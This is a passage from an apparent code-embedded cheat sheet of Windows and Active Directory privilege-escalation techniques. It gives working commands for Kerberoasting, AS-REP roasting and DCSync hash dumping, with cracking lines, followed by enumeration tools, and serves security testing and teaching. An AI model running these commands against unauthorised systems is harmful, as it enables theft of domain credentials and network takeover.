      command: "GetUserSPNs.py target.local/user:password -dc-ip DC_IP -request\n# Or in PowerShell:\nRubeus.exe kerberoast /outfile:hashes.txt",
      description: "Request TGS tickets for service accounts with SPNs. Crack the tickets offline to recover service account passwords. No admin rights needed.",
      example_output: "$krb5tgs$23$*svc_sql$TARGET.LOCAL$MSSQLSvc/sql01.target.local:1433*$hash...\n# Crack with: hashcat -m 13100 hashes.txt wordlist.txt",
      tools: ["GetUserSPNs.py", "Rubeus", "hashcat"],
      references: []
    },
    {
      technique: "AS-REP Roasting",
      category: "Active Directory",
      command: "GetNPUsers.py target.local/ -dc-ip DC_IP -usersfile users.txt -no-pass\n# Or:\nRubeus.exe asreproast /outfile:hashes.txt",
      description: "Find accounts with 'Do not require Kerberos preauthentication' enabled. Request AS-REP and crack the hash offline.",
      example_output: "$krb5asrep$23$svc_backup@TARGET.LOCAL:hash...\n# Crack with: hashcat -m 18200 hashes.txt wordlist.txt",
      tools: ["GetNPUsers.py", "Rubeus", "hashcat"],
      references: []
    },
    {
      technique: "DCSync Attack",
      category: "Active Directory",
      command: "secretsdump.py target.local/da-admin:password@DC_IP\n# Or with mimikatz:\nlsadump::dcsync /domain:target.local /all /csv",
      description: "Simulate DC replication to extract ALL password hashes from the domain. Requires Replicating Directory Changes permission (typically Domain Admins).",
      example_output: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:hash:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:hash:::\n(all domain user hashes)",
      tools: ["secretsdump.py", "mimikatz"],
      references: []
    }
  ],

  automatedTools: [
    {
      technique: "WinPEAS",
      category: "Automated Enumeration",
      command: "winPEASx64.exe\n# Or: winPEAS.bat",
      description: "The most comprehensive Windows privilege escalation enumeration tool. Color-coded output highlights the most likely escalation vectors.",
      example_output: "(extensive color-coded output covering services, permissions, tokens, credentials, network, processes, etc.)",
      tools: ["winPEAS"],
      references: ["https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"]
    },
    {
      technique: "PowerUp",
      category: "Automated Enumeration",
      command: "Import-Module .\\PowerUp.ps1\nInvoke-AllChecks",
      description: "PowerSploit's PowerUp module checks for common Windows privilege escalation vectors: service misconfigs, DLL hijacking, AlwaysInstallElevated, unquoted paths, etc.",
      example_output: "[*] Checking service permissions...\n\nServiceName   : VulnSvc\nPath          : C:\\Program Files\\Vuln App\\service.exe\nStartName     : LocalSystem\nAbuseFunction : Invoke-ServiceAbuse -Name 'VulnSvc'",
      tools: ["PowerUp"],
      references: ["https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc"]
    },
    {
      technique: "Seatbelt",
      category: "Automated Enumeration",
      command: "Seatbelt.exe -group=all",
      description: "GhostPack's Seatbelt performs security-oriented host survey. Covers credential stores, interesting files, network info, browser data, and more.",
      example_output: "(comprehensive security audit of the host)",
      tools: ["Seatbelt"],
      references: ["https://github.com/GhostPack/Seatbelt"]
    },
    {
      technique: "PrivescCheck",
      category: "Automated Enumeration",
      command: "Import-Module .\\PrivescCheck.ps1\nInvoke-PrivescCheck -Extended",
      description: "Modern PowerShell-based privilege escalation checker. Covers services, scheduled tasks, credentials, network, and more with extended checks.",
      example_output: "+------+------------------------------------------------+------+\n| OK   | APPS > Non-default Apps                        | Info |\n| KO!  | CONFIG > AlwaysInstallElevated                  | Vuln |\n| KO!  | SERVICES > Permissions - Non-default Services   | Vuln |",
      tools: ["PrivescCheck"],
      references: ["https://github.com/itm4n/PrivescCheck"]
    },
    {
      technique: "BeRoot",
      category: "Automated Enumeration",
      command: "beRoot.exe",
      description: "Checks common Windows misconfigurations that could allow privilege escalation. Simpler output than WinPEAS.",
      example_output: "[!] Unquoted Service Path found: C:\\Program Files\\Vuln App\\service.exe\n[!] AlwaysInstallElevated is enabled",
      tools: ["BeRoot"],
      references: ["https://github.com/AlessandroZ/BeRoot"]
    },
    {
      technique: "Watson — Missing Patches",
      category: "Automated Enumeration",
      command: "Watson.exe",
      description: "Identifies missing KBs and suggests kernel exploits for the target Windows version. Successor to Sherlock.",
      example_output: "[*] OS Build Number: 17763\n[*] Enumerating installed KBs...\n [!] CVE-2019-1458 : VULNERABLE\n  [>] https://exploit-db.com/exploits/47903",
      tools: ["Watson"],
      references: ["https://github.com/rasta-mouse/Watson"]
    },
    {
      technique: "Windows Exploit Suggester",
      category: "Automated Enumeration",
      command: "python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt",
      description: "Compare systeminfo output against Microsoft patch database to find missing patches with known exploits.",
      example_output: "[*] comparing against 156 exploits...\n[E] MS16-032: Secondary Logon Handle Privilege Escalation\n[E] MS17-010: EternalBlue SMB Remote Code Execution",
      tools: ["windows-exploit-suggester"],
      references: ["https://github.com/AonCyberLabs/Windows-Exploit-Suggester"]
    }
  ]
};
